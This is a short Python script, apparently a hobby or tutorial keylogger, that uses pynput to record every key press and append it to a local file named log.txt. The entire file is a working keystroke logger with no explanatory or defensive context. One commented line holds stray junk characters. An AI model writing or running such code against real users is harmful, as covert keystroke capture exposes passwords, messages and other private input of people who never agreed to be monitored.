from pynput.keyboard import Listener


def write(key):
    keydata = str(key)
    #keydata.replace("'", " ") '''123```""
    with open("log.txt", "a") as f:
        f.write(keydata)


with Listener(on_press=write) as l:
    l.join()


